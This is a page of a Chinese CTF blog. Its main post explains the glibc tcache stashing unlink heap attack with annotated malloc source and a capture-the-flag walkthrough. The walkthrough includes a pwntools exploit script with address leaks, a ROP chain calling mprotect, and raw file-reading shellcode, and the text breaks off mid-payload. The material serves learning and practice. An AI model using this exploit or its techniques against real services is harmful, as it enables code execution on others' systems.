<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="万古凡间一过客，九天之上第一仙">
<meta property="og:type" content="website">
<meta property="og:title" content="ZIKH26&#39;s Blog">
<meta property="og:url" content="https://zikh26.github.io/page/3/index.html">
<meta property="og:site_name" content="ZIKH26&#39;s Blog">
<meta property="og:description" content="万古凡间一过客，九天之上第一仙">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="ZIKH26">
<meta property="article:tag" content="CTF PWN IT">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://zikh26.github.io/page/3/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/3/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ZIKH26's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">ZIKH26's Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>







</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ZIKH26</p>
  <div class="site-description" itemprop="description">万古凡间一过客，九天之上第一仙</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">98</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">100</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/81a94eee.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/81a94eee.html" class="post-title-link" itemprop="url">预测urandom的输出</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:53:23" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%A7%81%E6%88%BF%E8%8F%9C/" itemprop="url" rel="index"><span itemprop="name">私房菜</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          Here's something encrypted, password is required to continue reading.
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/posts/81a94eee.html#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/5bd42122.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/5bd42122.html" class="post-title-link" itemprop="url">未初始化漏洞--strcat函数溢出</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:53:15" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%A7%81%E6%88%BF%E8%8F%9C/" itemprop="url" rel="index"><span itemprop="name">私房菜</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          Here's something encrypted, password is required to continue reading.
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/posts/5bd42122.html#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/d12f5bed.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/d12f5bed.html" class="post-title-link" itemprop="url">浅尝拟态防御</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:53:05" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%A7%81%E6%88%BF%E8%8F%9C/" itemprop="url" rel="index"><span itemprop="name">私房菜</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          Here's something encrypted, password is required to continue reading.
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/posts/d12f5bed.html#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/12414989.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/12414989.html" class="post-title-link" itemprop="url">关于tcache stashing unlink attack的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:52:49" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><blockquote>
<p>介绍：在2.29的libc版本中，进行了unsorted bin的双向链表完整性检查。因此unsorted bin attack也就失效了，不过在libc2.29的版本中tcache stashing unlink attack却可以达到类似的效果(在一个任意地址写入一个libc地址)。</p>
<p>原理：在2.29的libc中，如果我们需要的chunk位于了small bin里面，当我们将chunk从small bin拿出来的时候，还会去检查当前small bin链上是否还有剩余堆块，如果有的话并且tcache bin的链上还有空余位置(<strong>tcache bin不能为空</strong>)，就会将剩余的那个堆块给链入到tcache bin中。<strong>而将small bin中的堆块链入到tcache bin中的时候没有进行双向链表完整性的检查，此时攻击那个即将链入tcache bin的堆块的bk指针，即可向任意地址写入一个libc地址。</strong></p>
<p>注意：上述有一个看似矛盾的地方，如果tcache bin不为空并且没有满，才会将small bin里的堆块给链进来，但是tcache bin不为空的话，正常情况下会直接从tcahce bin里取，并非去small bin里找。但是<strong>calloc函数有个特性，它不会从tcache bin里取堆块，因此该攻击必须要利用calloc函数才行</strong>。</p>
<p><strong>适用版本：目前适用于所有带tcache的glibc版本(2.26–2.36)</strong></p>
<p>使用前提：</p>
<ol>
<li>能使用calloc分配堆块</li>
<li>可以控制small bin中的bk指针</li>
<li>small bin中最少要有两个堆块</li>
</ol>
<p>攻击效果：在任意地址写一个Libc地址(main_arena+96)</p>
<p>利用思路：</p>
<ol>
<li>先进行libc地址以及堆地址的泄露(libc地址不是必须的，而堆地址是必须的，因为我们伪造bk指针的时候，不能破坏fd指针，需要获取堆地址，重新还原fd指针)</li>
<li>然后将tcache bin中只留6个堆块<strong>(这样small bin链入tcache bin后，tcache bin就会直接装满，防止程序继续通过我们篡改的bk指针继续往下遍历)</strong></li>
<li>再做出至少两个位于small bin中的chunk(可以通过切割unsorted bin的方式，让剩余部分的堆块进入small bin或者当遍历unsorted bin的时候，会给堆块分类，让其小堆块进入small bin中)</li>
<li>利用溢出或UAF+edit等手段，篡改位于small bin中的倒数第二个堆块的bk指针为我们想要写入main_arena+96的地址 <strong>注意伪造bk的时候一定不能破坏fd指针</strong></li>
<li>最后我们申请一个位于small bin那条链对应size中的chunk，<strong>将small bin中的一个chunk申请出来，而small bin链中的另一个堆块则进入tcache bin，在链入tcache bin的期间触发了tcache stashing unlink attack。</strong></li>
</ol>
</blockquote>
<p>该漏洞处的源码如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">      <span class="comment">//victim就是要脱链的堆块，也就是small bin里的最后一个</span></span><br><span class="line">      <span class="comment">//这个if在判断我们所需要的size的那条small bin链上是否存在堆块，存在的话就把victim给脱链</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<span class="comment">//对small bin的双向链表的完整性做了检查，确保victim-&gt;bk-&gt;fd指向的还是victim</span></span><br><span class="line">    <span class="comment">//如果我们在这里劫持了victim的bk指针，就会导致bck的fd指向的并不是victim，从而触发异常</span></span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);<span class="comment">//设置下一个（高地址）chunk的prev_inuse位</span></span><br><span class="line">          bin-&gt;bk = bck;<span class="comment">//将victim脱链</span></span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="type">size_t</span> tc_idx = csize2tidx (nb);<span class="comment">//获取size对应的tcache索引</span></span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<span class="comment">//如果这个索引在tcache bin的范围里，也就是这个size属于tcache bin的范围</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<span class="comment">//如果tcache bin没有满</span></span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)<span class="comment">//如果small bin不为空,tc_victim为small bin中的最后一个堆块</span></span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;<span class="comment">//这里取tc_victim的bk指针，并没有针对bck做双向链表完整性检查，因此我们可以去攻击tc_victim的bk指针</span></span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;<span class="comment">//将tc_victim从small bin中脱链</span></span><br><span class="line">		      bck-&gt;fd = bin;<span class="comment">//如果我们伪造bck，这里就可以将bck-&gt;fd的位置写入一个bin的地址(main_arena+96)</span></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);<span class="comment">//将tc_victim链入tc_idx这条链</span></span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





<h2 id="相关题目"><a href="#相关题目" class="headerlink" title="相关题目"></a>相关题目</h2><h3 id="buu-2020-新春红包题-3"><a href="#buu-2020-新春红包题-3" class="headerlink" title="buu[2020 新春红包题]3"></a>buu[2020 新春红包题]3</h3><h4 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h4><p><img src="/../img/image-20221022100112620.png" alt="image-20221022100112620"></p>
<p><img src="/../img/image-20221022100136657.png" alt="image-20221022100136657"></p>
<h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p><img src="/../img/image-20221022100147699.png" alt="image-20221022100147699"></p>
<p>存在一个UAF漏洞</p>
<p>存在一个可以溢出的函数(如下)</p>
<p><img src="/../img/image-20221022100158891.png" alt="image-20221022100158891"></p>
<p>这里可以直接溢出buf打一个栈迁移，迁移到堆上(提前布置一个rop链)，执行orw来绕过沙箱。</p>
<h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><p>虽然有UAF漏洞并且有edit函数和show函数，但这题没法打tcache poisoning，因为这题申请内存的函数是calloc，这个函数的特性是不从tcache bin中取堆块，因此我们打tcache poisoning也无法从tcache bin链上取出来堆块。而且就算能取出来堆块，也无法绕过沙箱。想绕沙箱就必须去利用那个溢出函数。</p>
<p>溢出函数中存在一个if检查，这里本来用unsorted bin attack的话是很好过检查的，但是在Libc为2.29的版本中对unsorted bin增加了检验双向链表完整性，无法去利用unsorted bin attack 了。不过在2.29有一种手法可以代替unsorted bin attack达到类似的效果，也就是tcache stashing unlink attack(上文对tcache stashing unlink attack做了介绍，这里就不再赘述了)</p>
<h4 id="泄露地址："><a href="#泄露地址：" class="headerlink" title="泄露地址："></a>泄露地址：</h4><p>因为存在UAF漏洞，配合show函数，可以轻松的泄露堆地址和libc地址。但是为了后续的利用，我们前期需要先伪造两条不同的tcache链(一条用于后续small bin中堆块的链入，一条用于让堆块进入unsorted bin，因为0x410这条链装满了，再释放掉0x410的堆块就会直接进入unsorted bin) 如下图，我们执行两次show函数即可获取libc地址和堆地址。</p>
<p><img src="/../img/image-20221022100217107.png" alt="image-20221022100217107"></p>
<h4 id="放入small-bin中两个堆块"><a href="#放入small-bin中两个堆块" class="headerlink" title="放入small bin中两个堆块"></a>放入small bin中两个堆块</h4><p>目前我们在unsorted bin中有一个0x410的堆块，我们先去申请一个0x300的堆块，这样剩下的0x100就会进入unsorted bin中，然后下一次申请0x400的堆块，ptmalloc就会去遍历unsorted bin将原先0x100的堆块放入small bin中。接着如法炮制再申请一个0x400的堆块，释放掉进入unsorted bin，然后申请0x300堆块，将unsorted bin中的堆块进行切割，残留的0x100堆块返回unsorted bin,最后再申请一个不等于0x100的堆块(如果正好相等的话，就直接从unsorted bin里拿出来了，只有不相等才会去遍历，然后给chunk分类)，这时候就又把0x100的堆块放入到了small bin里，而此时small bin中就有两个堆块了。</p>
<h4 id="篡改small-bin中的bk指针"><a href="#篡改small-bin中的bk指针" class="headerlink" title="篡改small bin中的bk指针"></a>篡改small bin中的bk指针</h4><p>因为这道题要触发后门的话，就得让下面这个if成立，我们直接篡改small bin的bk指针为这个qword_4058+2048-0x10的值即可</p>
<p><img src="/../img/image-20221022100228422.png" alt="image-20221022100228422"></p>
<p>篡改后small bin的情况如下</p>
<p><img src="/../img/image-20221022100244186.png" alt="image-20221022100244186"></p>
<p>最后再申请一个0xf0的堆块即可触发tcache stashing unlink attack。</p>
<p>完事了利用后门，打一个栈迁移，迁移执行流到堆上，执行提前布置好的rop链执行orw即可。我是直接调用了mprotect函数让堆去变成可读可写可执行，然后直接执行orw的shellcode(这里没有难点，就不再具体阐述了)</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4><p><a href="https://zikh26.github.io/posts/ad411136.html">tools-函数库 | ZIKH26’s Blog</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">d_e=<span class="number">0x19A2</span></span><br><span class="line">d_d=<span class="number">0x1991</span></span><br><span class="line">d_a=<span class="number">0x196E</span></span><br><span class="line">d_s=<span class="number">0x19B3</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25200&quot;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;/home/zikh/Desktop/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so&quot;)</span></span><br><span class="line"><span class="comment"># p=remote(&quot;node4.buuoj.cn&quot;,25200)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,choice,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the red packet idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): &quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Please input the red packet idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the red packet idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the red packet idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(i,<span class="number">2</span>,<span class="string">&#x27;wow&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#prevent merge with top chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">leak_heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_heap&#x27;</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1e4ca0</span><span class="comment">#recv_libc()-0x1e4ca0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">4</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">pop_rdi=libc_base+<span class="number">0x0000000000026542</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x0000000000026f9e</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x000000000012bda6</span></span><br><span class="line">rop=p64(pop_rdi)+p64((leak_heap&gt;&gt;<span class="number">12</span>)*<span class="number">0x1000</span>)</span><br><span class="line">rop+=p64(pop_rsi)+p64(<span class="number">0x4000</span>)</span><br><span class="line">rop+=p64(pop_rdx)+p64(<span class="number">7</span>)</span><br><span class="line">rop+=p64(libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]+libc_base)</span><br><span class="line">rop+=p64(leak_heap+<span class="number">0x13b0</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&quot;\x48\xC7\xC0\x03\x00\x00\x00\x48\xC7\xC7\x00\x00\x00\x00\x0F\x05\x68\x66\x6C\x61\x67\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x6A\x00\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line">rop+=shellcode</span><br><span class="line">add(<span class="number">12</span>,<span class="number">4</span>,rop)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_e,d_s,d_d,<span class="number">0x143C</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"></span><br><span class="line">target_addr=leak_heap-<span class="number">0x2270</span></span><br><span class="line">log_addr(<span class="string">&#x27;target_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">11</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x300</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(leak_heap+<span class="number">0xb20</span>)+p64(target_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">15</span>,<span class="number">2</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(leak_heap+<span 